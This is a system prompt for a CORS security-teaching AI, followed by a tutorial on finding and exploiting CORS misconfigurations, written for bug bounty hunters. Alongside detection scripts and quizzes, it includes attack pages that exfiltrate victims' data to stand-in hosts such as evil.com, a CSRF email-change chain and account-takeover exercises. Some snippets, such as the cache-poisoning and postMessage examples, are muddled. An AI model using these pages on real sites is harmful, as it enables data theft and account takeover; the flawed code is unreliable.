You are an elite Cross-Origin Resource Sharing (CORS) Learning AI, specializing in teaching cross-origin access control security. Your expertise focuses on educating bug bounty hunters about CORS misconfigurations, overly permissive origins, and cross-origin data exfiltration prevention.

Your mission is to guide aspiring security researchers through CORS complexities, teaching them systematic approaches to testing CORS policies, identifying misconfigurations, and developing secure cross-origin access implementations.

Key Learning Objectives:
- **CORS Policy Analysis**: Master Access-Control-Allow-Origin header assessment
- **Origin Validation**: Learn origin header validation and reflection testing
- **Method Permissions**: Assess Access-Control-Allow-Methods configurations
- **Header Permissions**: Evaluate Access-Control-Allow-Headers settings
- **Credentials Handling**: Test Access-Control-Allow-Credentials security
- **Preflight Request Analysis**: Study OPTIONS request handling and validation
- **Null Origin Handling**: Assess null origin acceptance patterns

Advanced Learning Concepts:
- **Origin Spoofing**: Test origin header manipulation and spoofing techniques
- **Subdomain Exploitation**: Learn subdomain-based CORS bypass methods
- **Development Mode Detection**: Identify debug and development CORS configurations
- **Cache Poisoning**: Test CORS header cache poisoning opportunities
- **Header Injection**: Combine CORS with HTTP header injection attacks
- **Timing Attacks**: Use timing differences to infer CORS policy behavior
- **PostMessage Integration**: Assess CORS bypass through postMessage APIs

Learning Process:
1. **CORS Fundamentals**: Understand cross-origin resource sharing principles and policies
2. **Header Analysis**: Learn CORS header identification and assessment
3. **Origin Testing**: Study origin validation and reflection testing techniques
4. **Permission Assessment**: Evaluate method and header permission configurations
5. **Credential Security**: Test credentials handling in CORS contexts
6. **Preflight Analysis**: Assess OPTIONS request handling and validation
7. **Misconfiguration Testing**: Learn common CORS misconfiguration identification

Teaching Methodology:
- **CORS Labs**: Hands-on CORS policy testing exercises
- **Header Analysis**: CORS header identification and assessment training
- **Origin Testing**: Origin validation and reflection testing frameworks
- **Permission Assessment**: Method and header permission testing guides
- **Credential Workshops**: Credentials handling security assessment
- **Preflight Analysis**: OPTIONS request handling and validation exercises
- **Real-World Scenarios**: Case studies of CORS misconfiguration exploitation

Output Format:
- **CORS Modules**: Structured learning units for CORS security concepts
- **Header Exercises**: Practical CORS header testing labs
- **Origin Labs**: Origin validation and reflection testing exercises
- **Permission Workshops**: Method and header permission assessment frameworks
- **Credential Tutorials**: Credentials handling security testing guides
- **Preflight Labs**: OPTIONS request handling and validation exercises
- **Case Studies**: Real-world CORS misconfiguration examples

Example Learning Query: "Teach me CORS security testing from basics to expert level"

Ensure learning materials are comprehensive, practical, and focused on developing expert-level CORS security assessment skills.

---

# MODULE 1: CORS Fundamentals

## 1.1 What is CORS?

Cross-Origin Resource Sharing is a browser security mechanism that controls how web pages from one origin can request resources from a different origin. CORS uses HTTP headers to tell browsers whether to allow cross-origin requests.

**Same-Origin Policy (SOP):**
```
Origin = Protocol + Domain + Port
https://example.com:443 = https://example.com:443 (same)
https://example.com = http://example.com (different - protocol)
https://example.com = https://evil.com (different - domain)
https://example.com:443 = https://example.com:8080 (different - port)
```

**Simple requests (no preflight):**
```
GET, POST, HEAD with Content-Type:
- application/x-www-form-urlencoded
- multipart/form-data
- text/plain
```

**Non-simple requests (preflight required):**
```
PUT, DELETE, PATCH
Content-Type: application/json
Custom headers (Authorization, X-Custom-Header)
```

## 1.2 CORS Headers

```
Request headers (sent by browser):
  Origin: https://example.com
  Access-Control-Request-Method: POST
  Access-Control-Request-Headers: Content-Type, Authorization

Response headers (set by server):
  Access-Control-Allow-Origin: https://example.com
  Access-Control-Allow-Methods: GET, POST, PUT, DELETE
  Access-Control-Allow-Headers: Content-Type, Authorization
  Access-Control-Allow-Credentials: true
  Access-Control-Max-Age: 86400
  Access-Control-Expose-Headers: X-Custom-Header
```

## 1.3 How CORS Works

```javascript
// Browser sends preflight for non-simple requests
fetch('https://api.target.com/data', {
    method: 'PUT',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer token123'
    },
    body: JSON.stringify({key: 'value'})
});

// Browser sends:
// OPTIONS https://api.target.com/data
// Origin: https://evil.com
// Access-Control-Request-Method: PUT
// Access-Control-Request-Headers: Content-Type, Authorization

// Server responds with CORS headers:
// Access-Control-Allow-Origin: https://evil.com
// Access-Control-Allow-Credentials: true
// Access-Control-Allow-Methods: GET, POST, PUT
// Access-Control-Allow-Headers: Content-Type, Authorization

// If allowed, browser sends actual request
```

---

# MODULE 2: CORS Misconfiguration Detection

## 2.1 Origin Reflection

The server reflects the Origin header in Access-Control-Allow-Origin:

```python
import requests

def test_origin_reflection(target_url):
    """Test if server reflects arbitrary origins"""
    
    test_origins = [
        "https://evil.com",
        "https://attacker.com",
        "null",
        "https://example.com.evil.com",
        "https://evil-example.com",
    ]
    
    for origin in test_origins:
        headers = {'Origin': origin}
        response = requests.get(target_url, headers=headers)
        
        acao = response.headers.get('Access-Control-Allow-Origin', '')
        acac = response.headers.get('Access-Control-Allow-Credentials', '')
        
        print(f"Origin: {origin}")
        print(f"  ACAO: {acao}")
        print(f"  ACAC: {acac}")
        
        if acao == origin:
            print(f"  [!] ORIGIN REFLECTED - Vulnerable!")
        elif acao == '*':
            print(f"  [!] WILDCARD - Check credentials")
        else:
            print(f"  [*] Not reflected")

# Usage
test_origin_reflection("https://target.com/api/userinfo")
```

## 2.2 Null Origin Acceptance

```python
import requests

def test_null_origin(target_url):
    """Test if server accepts null origin"""
    
    # Browsers send Origin: null for:
    # - sandboxed iframes
    # - data: URIs
    # - file: URIs
    # - redirects from HTTPS to HTTP
    
    headers = {'Origin': 'null'}
    response = requests.get(target_url, headers=headers)
    
    acao = response.headers.get('Access-Control-Allow-Origin', '')
    acac = response.headers.get('Access-Control-Allow-Credentials', '')
    
    print(f"Origin: null")
    print(f"  ACAO: {acao}")
    print(f"  ACAC: {acac}")
    
    if acao == 'null':
        print("  [!] NULL ORIGIN ACCEPTED - Vulnerable!")
        print("  [!] Exploit: Create sandboxed iframe with data: URI")
    
    return acao == 'null'

# Usage
test_null_origin("https://target.com/api/userinfo")
```

**Exploit for null origin acceptance:**

```html
<!-- Host this on attacker.com -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        src="data:text/html,<script>/* exploit here */</script>">
</iframe>

<script>
// Inside the sandboxed iframe, Origin is 'null'
fetch('https://target.com/api/userinfo', {credentials: 'include'})
    .then(r => r.json())
    .then(data => {
        // Exfiltrate data
        parent.postMessage(JSON.stringify(data), '*');
    });
</script>
```

## 2.3 Subdomain-Based Bypass

```python
import requests

def test_subdomain_bypass(target_url, base_domain):
    """Test if subdomains can be used to bypass CORS"""
    
    # Test various subdomain patterns
    subdomains = [
        f"https://{base_domain}",
        f"https://www.{base_domain}",
        f"https://api.{base_domain}",
        f"https://test.{base_domain}",
        f"https://dev.{base_domain}",
        f"https://staging.{base_domain}",
        f"https://admin.{base_domain}",
        f"https://portal.{base_domain}",
        f"https://app.{base_domain}",
        f"https://mail.{base_domain}",
        f"https://blog.{base_domain}",
        f"https://shop.{base_domain}",
    ]
    
    for origin in subdomains:
        headers = {'Origin': origin}
        response = requests.get(target_url, headers=headers)
        
        acao = response.headers.get('Access-Control-Allow-Origin', '')
        acac = response.headers.get('Access-Control-Allow-Credentials', '')
        
        if acao == origin and acac.lower() == 'true':
            print(f"[!] Subdomain accepted with credentials: {origin}")
        elif acao == origin:
            print(f"[!] Subdomain reflected: {origin}")
        elif '*' in acao:
            print(f"[*] Wildcard with subdomain: {origin}")

# Usage
test_subdomain_bypass("https://target.com/api/userinfo", "target.com")
```

## 2.4 Regex-Based Bypass

```python
import requests

def test_regex_bypass(target_url):
    """Test common regex bypass patterns"""
    
    # Common vulnerable regex patterns
    bypass_origins = [
        "https://target.com.evil.com",    # endsWith check
        "https://evil.target.com.com",     # endsWith check
        "https://eviltarget.com",          # contains check
        "https://targetXcom.evil.com",     # replace check
        "https://target.com%0d%0aevil.com", # injection
    ]
    
    for origin in bypass_origins:
        headers = {'Origin': origin}
        response = requests.get(target_url, headers=headers)
        
        acao = response.headers.get('Access-Control-Allow-Origin', '')
        if acao == origin:
            print(f"[!] Regex bypass: {origin}")
            print(f"    ACAO: {acao}")

# Usage
test_regex_bypass("https://target.com/api/userinfo")
```

---

# MODULE 3: CORS Exploitation

## 3.1 Data Exfiltration via CORS

```python
# Scenario: Server reflects origin with credentials
# Attacker can read victim's data from their malicious site

import requests

def exploit_cors_reflection(target_api, attacker_domain):
    """Exploit CORS origin reflection to steal data"""
    
    # The attacker hosts this JavaScript on their domain
    exploit_js = f"""
<script>
// Step 1: Load victim's page in hidden iframe (to set cookies)
var iframe = document.createElement('iframe');
iframe.style.display = 'none';
iframe.src = 'https://target.com/account';
document.body.appendChild(iframe);

// Step 2: Wait for cookies to be set
setTimeout(function() {{
    // Step 3: Make cross-origin request with credentials
    fetch('{target_api}/api/userinfo', {{
        credentials: 'include'
    }})
    .then(function(response) {{
        return response.json();
    }})
    .then(function(data) {{
        // Step 4: Exfiltrate data to attacker's server
        fetch('https://{attacker_domain}/collect?data=' + btoa(JSON.stringify(data)));
    }});
}}, 2000);
</script>
"""
    return exploit_js

# Usage
js = exploit_cors_reflection("https://target.com", "evil.com")
print(js)
```

## 3.2 Exploit for Origin Reflection

```html
<!-- Host this on attacker.com -->
<html>
<body>
<h1>Click here for free coupons!</h1>
<script>
// Step 1: Silently load target.com in iframe
var iframe = document.createElement('iframe');
iframe.src = 'https://target.com';
iframe.style.display = 'none';
document.body.appendChild(iframe);

// Step 2: Wait for session to establish
setTimeout(function() {
    // Step 3: Exploit CORS to read user data
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://target.com/api/userinfo', true);
    xhr.withCredentials = true;
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            // Step 4: Send stolen data to attacker
            var stolenData = btoa(xhr.responseText);
            new Image().src = 'https://evil.com/steal?data=' + stolenData;
        }
    };
    xhr.send();
}, 3000);
</script>
</body>
</html>
```

## 3.3 Null Origin Exploit

```html
<!-- Host this on attacker.com with sandboxed iframe -->
<html>
<body>
<iframe id="sandbox" 
        sandbox="allow-scripts allow-forms" 
        src="data:text/html,<script>EXPLOIT_SCRIPT</script>"
        style="display:none">
</iframe>
<script>
// Receive stolen data from iframe
window.addEventListener('message', function(e) {
    // Forward to attacker's server
    fetch('https://evil.com/collect', {
        method: 'POST',
        body: e.data
    });
});
</script>
</body>
</html>
```

## 3.4 CORS to CSRF Chain

```python
# When CORS allows reading responses, CSRF becomes more powerful
# because attacker can verify the attack succeeded

exploit_js = """
fetch('https://target.com/api/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'attacker@evil.com'})
})
.then(r => r.json())
.then(data => {
    // Can read response - verify attack succeeded
    fetch('https://evil.com/log?result=' + btoa(JSON.stringify(data)));
});
"""
```

---

# MODULE 4: CORS Header Analysis

## 4.1 Dangerous CORS Configurations

```python
import requests

def full_cors_analysis(target_url):
    """Comprehensive CORS misconfiguration analysis"""
    
    print("=== CORS Analysis ===\n")
    
    # Test with various origins
    origins = [
        "https://evil.com",
        "null",
        "https://target.com.evil.com",
        "https://evil.target.com",
        "https://www.target.com",
        "http://target.com",      # HTTP version
        "https://TARGET.COM",     # Case variation
        "https://target.com/",    # Trailing slash
    ]
    
    for origin in origins:
        response = requests.get(target_url, headers={'Origin': origin})
        
        acao = response.headers.get('Access-Control-Allow-Origin', '')
        acac = response.headers.get('Access-Control-Allow-Credentials', '')
        acam = response.headers.get('Access-Control-Allow-Methods', '')
        acah = response.headers.get('Access-Control-Allow-Headers', '')
        acex = response.headers.get('Access-Control-Expose-Headers', '')
        acma = response.headers.get('Access-Control-Max-Age', '')
        
        print(f"Origin: {origin}")
        print(f"  ACAO: {acao}")
        print(f"  ACAC: {acac}")
        if acam: print(f"  ACAM: {acam}")
        if acah: print(f"  ACAH: {acah}")
        if acex: print(f"  ACEX: {acex}")
        if acma: print(f"  ACMA: {acma}")
        
        # Risk assessment
        if acao == '*' and acac.lower() == 'true':
            print("  [CRITICAL] Wildcard with credentials!")
        elif acao == origin and acac.lower() == 'true':
            print("  [HIGH] Origin reflected with credentials!")
        elif acao == 'null' and acac.lower() == 'true':
            print("  [HIGH] Null origin accepted with credentials!")
        elif acao == '*':
            print("  [MEDIUM] Wildcard without credentials")
        else:
            print("  [INFO] Origin not reflected")
        print()

# Usage
full_cors_analysis("https://target.com/api/userinfo")
```

## 4.2 Preflight Analysis

```python
def analyze_preflight(target_url):
    """Analyze OPTIONS preflight response"""
    
    response = requests.options(target_url, headers={
        'Origin': 'https://evil.com',
        'Access-Control-Request-Method': 'DELETE',
        'Access-Control-Request-Headers': 'Authorization, Content-Type'
    })
    
    print("=== Preflight Response ===")
    print(f"Status: {response.status_code}")
    
    for header, value in response.headers.items():
        if 'access-control' in header.lower():
            print(f"{header}: {value}")
    
    # Check for dangerous configurations
    acam = response.headers.get('Access-Control-Allow-Methods', '')
    acah = response.headers.get('Access-Control-Allow-Headers', '')
    
    if 'DELETE' in acam:
        print("[!] DELETE method allowed")
    if 'PUT' in acam:
        print("[!] PUT method allowed")
    if 'Authorization' in acah:
        print("[!] Authorization header allowed")
    if 'X-Custom-Header' in acah:
        print("[!] Custom headers allowed")

# Usage
analyze_preflight("https://target.com/api/userinfo")
```

---

# MODULE 5: Advanced CORS Attacks

## 5.1 CORS Cache Poisoning

```python
import requests

def test_cors_cache_poisoning(target_url):
    """Test if CORS headers can be cached"""
    
    # Send request with malicious origin
    headers = {
        'Origin': 'https://evil.com',
        'Vary': 'Origin'  # Check if Vary header is missing
    }
    
    response1 = requests.get(target_url, headers=headers)
    response2 = requests.get(target_url)  # Without Origin header
    
    acao1 = response1.headers.get('Access-Control-Allow-Origin', '')
    acao2 = response2.headers.get('Access-Control-Allow-Origin', '')
    
    print(f"Response 1 (with Origin): {acao1}")
    print(f"Response 2 (no Origin): {acao2}")
    
    # If Vary: Origin is missing, cached response may include malicious CORS
    vary = response1.headers.get('Vary', '')
    if 'Origin' not in vary and acao1:
        print("[!] Potential CORS cache poisoning - missing Vary: Origin")

# Usage
test_cors_cache_poisoning("https://target.com/api/userinfo")
```

## 5.2 CORS via Header Injection

```python
def test_cors_header_injection(target_url):
    """Test if CRLF injection can inject CORS headers"""
    
    # Inject newlines in parameter
    payload = "%0d%0aAccess-Control-Allow-Origin:%20https://evil.com"
    
    response = requests.get(f"{target_url}?param={payload}")
    
    # Check if CORS header was injected
    for header, value in response.headers.items():
        if 'access-control' in header.lower():
            print(f"[!] Header injection possible: {header}: {value}")

# Usage
test_cors_header_injection("https://target.com/page")
```

## 5.3 PostMessage CORS Bypass

```html
<!-- If application uses postMessage without origin validation -->
<iframe id="target" src="https://target.com/page"></iframe>
<script>
var targetFrame = document.getElementById('target');

// Listen for messages
window.addEventListener('message', function(event) {
    // Check if origin is validated (vulnerable if not)
    if (event.origin !== 'https://target.com') {
        // This check may be missing or bypassable
        return;
    }
    
    // Process message - if no proper validation, attacker can spoof
    console.log('Received:', event.data);
    
    // Send malicious message
    targetFrame.postMessage({
        action: 'updateEmail',
        email: 'attacker@evil.com'
    }, 'https://target.com');
});
</script>
```

## 5.4 CORS with WebSocket

```javascript
// WebSocket connections are not subject to CORS
// But the server should validate Origin header

var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send(JSON.stringify({
        action: 'changeEmail',
        email: 'attacker@evil.com'
    }));
};

// If server doesn't validate Origin in WebSocket handshake
// Attacker can connect from malicious origin
```

---

# MODULE 6: CORS Testing Automation

## 6.1 Comprehensive CORS Scanner

```python
import requests
import concurrent.futures
import json

class CORSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.results = []
    
    def test_origin(self, origin):
        """Test a single origin"""
        headers = {'Origin': origin}
        response = requests.get(self.target_url, headers=headers, timeout=10)
        
        acao = response.headers.get('Access-Control-Allow-Origin', '')
        acac = response.headers.get('Access-Control-Allow-Credentials', '')
        
        return {
            'origin': origin,
            'acao': acao,
            'acac': acac,
            'reflected': acao == origin,
            'vulnerable': acao == origin and acac.lower() == 'true'
        }
    
    def scan(self):
        """Run comprehensive scan"""
        origins = [
            "https://evil.com",
            "https://attacker.com",
            "null",
            "https://target.com.evil.com",
            "https://evil.target.com",
            "http://target.com",
            "https://TARGET.COM",
            "https://target.com:443",
            "https://target.com:8080",
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(self.test_origin, o): o for o in origins}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                self.results.append(result)
                
                if result['vulnerable']:
                    print(f"[!] CRITICAL: {result['origin']} reflected with credentials")
                elif result['reflected']:
                    print(f"[!] HIGH: {result['origin']} reflected")
                else:
                    print(f"[*] {result['origin']}: Not reflected")
        
        return self.results
    
    def generate_report(self):
        """Generate JSON report"""
        vulnerable = [r for r in self.results if r['vulnerable']]
        reflected = [r for r in self.results if r['reflected']]
        
        return {
            'target': self.target_url,
            'total_tests': len(self.results),
            'vulnerable': len(vulnerable),
            'reflected': len(reflected),
            'details': self.results
        }

# Usage
scanner = CORSScanner("https://target.com/api/userinfo")
results = scanner.scan()
report = scanner.generate_report()
print(json.dumps(report, indent=2))
```

---

# MODULE 7: Practical Exercises

## Exercise 1: Origin Reflection Detection

**Target:** Detect CORS origin reflection misconfiguration.

**Steps:**
1. Send request with `Origin: https://evil.com`
2. Check if response contains `Access-Control-Allow-Origin: https://evil.com`
3. Check if `Access-Control-Allow-Credentials: true` is also present
4. Create an exploit page on evil.com
5. Verify you can read victim's data cross-origin

## Exercise 2: Null Origin Exploitation

**Target:** Exploit null origin acceptance for data theft.

**Steps:**
1. Test if `Origin: null` is accepted
2. Create a sandboxed iframe with `data:` URI
3. Make cross-origin requests from the sandboxed context
4. Exfiltrate data via postMessage to parent frame
5. Document the attack chain

## Exercise 3: Subdomain CORS Bypass

**Target:** Find a subdomain that can be used to bypass CORS.

**Steps:**
1. Enumerate subdomains of the target
2. Test each subdomain as Origin header
3. If a subdomain is reflected with credentials, check if you can control content on that subdomain
4. If the subdomain has XSS, chain with CORS to steal data from the main domain
5. Document the complete attack chain

## Exercise 4: Regex Bypass

**Target:** Bypass a regex-based CORS validation.

**Steps:**
1. Test if the server uses regex matching (e.g., endsWith)
2. Try bypasses like `https://target.com.evil.com`
3. Try `https://evil.target.com.com`
4. Try URL-encoding variations
5. If bypass succeeds, create an exploit

## Exercise 5: CORS to Account Takeover

**Target:** Chain CORS with other vulnerabilities for ATO.

**Steps:**
1. Confirm CORS misconfiguration
2. Use CORS to read victim's API tokens
3. Use the stolen tokens to take over the account
4. Document the complete attack chain

---

# MODULE 8: Assessment Questions

## Beginner Level

1. What is the Same-Origin Policy and how does CORS relate to it?
2. What is the difference between Access-Control-Allow-Origin and Access-Control-Allow-Credentials?
3. Why is the `null` origin sometimes accepted by servers?
4. What is a CORS preflight request?
5. Name three CORS headers and their purposes.

## Intermediate Level

6. Explain why reflecting the Origin header with credentials is dangerous.
7. How can a subdomain takeover be used to bypass CORS protections?
8. What is the difference between Access-Control-Allow-Origin and Access-Control-Expose-Headers?
9. How does the Vary header prevent CORS cache poisoning?
10. Describe a CORS-based data exfiltration attack.

## Advanced Level

11. Explain a complete attack chain from CORS misconfiguration to account takeover.
12. How would you bypass CORS protections that use regex-based origin validation?
13. Describe how CORS misconfigurations can be chained with CSRF vulnerabilities.
14. What are the best practices for configuring CORS securely?
15. How does CORS interact with WebSocket connections and what are the security implications?

---

# MODULE 9: Further Reading

- **OWASP CORS**: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing
- **PortSwigger CORS**: https://portswigger.net/web-security/cors
- **HackTricks CORS**: https://book.hacktricks.xyz/pentesting-web/cors-cors-misconfiguration
- **MDN CORS**: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
- **CORS misconfiguration exploitation**: https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-a-cors-misconfiguration-e426e0f6b348
- **CORS for pentesters**: https://pentester.land/tips-and-tricks/cors-for-pentesters/
- **Real-world CORS bugs**: Filter HackerOne/Bugcrowd reports for "CORS misconfiguration"
- **Browser CORS behavior**: https://fetch.spec.whatwg.org/#cors-preflight-fetch